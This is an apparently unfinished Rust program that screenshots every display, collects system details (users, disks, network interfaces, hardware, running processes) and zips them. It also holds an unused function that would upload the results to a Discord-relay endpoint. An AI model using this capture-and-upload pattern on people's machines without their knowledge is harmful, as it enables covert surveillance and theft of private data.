use sysinfo::{NetworkExt, ProcessExt, System, SystemExt};
use super::{
    http, global
};

// Define global variables
lazy_static::lazy_static! {
    pub static ref ZIP_PATH: String = sha256::digest(global::get_time().as_nanos().to_string());
}

/*

    https://crates.io/crates/file-lock
    https://crates.io/crates/sysinfo

*/


// The send_discord_request function is used to send a request
// to our discord api to send a message to a discord channel.
fn send_files_to_discord(image: &str, zip_file: &str) {
    // Get the bearer token
    let bearer: String = match global::get_bearer() {
        Ok(b) => b,
        Err(e) => panic!("Error: {}", e)
    };

    // Get the access token
    let access_token: String = global::generate_access_token(&bearer);

    // Build the http request
    let resp = http::CLIENT
        .put("http://localhost:8080/discord/send/")
        .header("authorization", &bearer)
        .header("access_token", access_token)
        .json(&serde_json::json!({
            "embeds": "{}",
            "image": image,
            "zip_file": zip_file
        }))
        .send().expect("failed to send discord request");
}

// Take a screenshot and save it to the current folder
fn take_screenshot(zip: &mut zip::ZipWriter<std::fs::File>, current_time: &str) {
    let screens = screenshots::Screen::all().expect("failed to get screens");

    // Iterate through all the screens
    screens.iter().for_each(|s| {
        // Capture the screen and get the image buffer
        let image = s.capture().expect("failed to capture screen");
        let image_buffer = image.buffer();

        // Add the image to the zip file
        add_to_zip_file(
            zip, 
            &format!("{}_{}.png", s.display_info.id, current_time), 
            &image_buffer
        );

        // Send this in the request body to our api
        let image_to_send_in_api : String = format!("data:image/png;base64,{}", base64::encode(image_buffer).to_string());
    });
}

// Add a file to the zip file
fn add_to_zip_file(
    zip: &mut zip::ZipWriter<std::fs::File>, file_name: &str, file_content: &Vec<u8>
) {

    // Add a file to the zip file
    match zip.start_file(file_name, zip::write::FileOptions::default()) {
        Ok(f) => f,
        Err(e) => panic!("Error: {}", e)
    };

    // Write the file to the zip file
    std::io::Write::write_all(zip, file_content)
        .expect("failed to write to zip file");
}

// Create a zip file
fn create_zip_file() -> zip::ZipWriter<std::fs::File> {
    // Create a new zip file
    let zip_file = match std::fs::File::create(ZIP_PATH.to_string() + ".zip") {
        Ok(f) => f,
        Err(e) => panic!("Error: {}", e)
    };

    // Return the zip writer
    return zip::ZipWriter::new(zip_file);
}

// Create a new folder with the current time as it's name
fn create_new_folder(name: &str) {
    std::fs::create_dir(name).expect("failed to create folder");
}

// Main function for testing
fn main() {

    // Create a new system struct
    let mut sys: System = System::new_all();

    // Refresh this for every loop in thread
    let current_time: String = chrono::offset::Utc::now().format("%Y-%m-%d %H:%M:%S").to_string();

    // Create the new zip file
    let mut zip = create_zip_file();

    // Take a scrteenshot
    take_screenshot(&mut zip, &current_time);

    // Get the system information
    let sys_info: String = get_sys_info(&mut zip, &mut sys, &current_time);
    println!("{}", sys_info);
}

// The get_sys_info function is used to get the system information
// and return it as a string.
fn get_sys_info(
    zip: &mut zip::ZipWriter<std::fs::File>, sys: &mut System, current_time: &str
) -> String {
    // Refresh system information
    sys.refresh_all();

    // Create a new string to store the system information
    let mut result: String = String::new();

    // Append the users to the result string
    result.push_str(&format!("\n\nUsers:\n\n"));
    sys.users().iter().for_each(|u| {
        result.push_str(&format!("    {:?}\n", u));
    });

    // Append the system disks to the result string
    result.push_str(&format!("Disks:\n\n"));
    sys.disks().iter().for_each(|d| {
        result.push_str(&format!("    {:?}\n", d));
    });

    // Append the network interfaces name, data received 
    // and data transmitted to the result string
    result.push_str(&format!("\n\nNetworks:\n\n"));
    for (name, data) in sys.networks() {
        result.push_str(
            &format!("    {} => Recieved: {} => Transmitted: {}\n", name, data.received(), data.transmitted())
        );
    }

    // Append the system components to the result string
    result.push_str(&format!("\n\nComponents:\n\n"));
    sys.components().iter().for_each(|c| {
        result.push_str(&format!("{:?}", c))
    });

    // Append the system components to the result string
    result.push_str(&format!("\n\nHardware Information:\n\n"));
    result.push_str(&format!("
        Total Memory: {} bytes
        Used Memory: {} bytes
        Total Swap: {} bytes
        Used Swap: {} bytes
        Boot Time: {} seconds
        Up Time: {:?}

        System Name: {:?}
        System Kernel Version: {:?}
        System OS Version: {:?}
        System Host Name: {:?}
        Distribution ID: {:?}
        Global CPU Info: {:?}
        Available Memory: {:?}
        Number of CPUs: {:?}
    ", 
        sys.total_memory(), sys.used_memory(), sys.total_swap(), sys.used_swap(), sys.boot_time(),
        sys.uptime(), sys.name(), sys.kernel_version(), sys.long_os_version(), sys.host_name(),
        sys.distribution_id(), sys.global_cpu_info(), sys.available_memory(), sys.physical_core_count()
    ));

    // Append the system processes to the result string
    result.push_str(&format!("\n\nProcesses:\n\n"));
    for (pid, process) in sys.processes() {
        println!("Process {:?}:", process);
        result.push_str(&format!(
            "Process [{pid}]:
                Name: {}
                Disk Usage: {:?}
                Memory Usage: {}
                Virtual Memory: {}
                CPU Usage: {}
                Status: {}
                Start Time: {}
                Run Time: {}
            ",
            process.name(), process.disk_usage(), process.memory(), process.virtual_memory(), 
            process.cpu_usage(), process.status(), process.start_time(), process.run_time()
        ));
    }

    // Add to the zip file
    add_to_zip_file(
        zip, &format!("{}_sys_info.txt", current_time), &result.as_bytes().to_vec()
    );

    // Return the result string
    return result;
}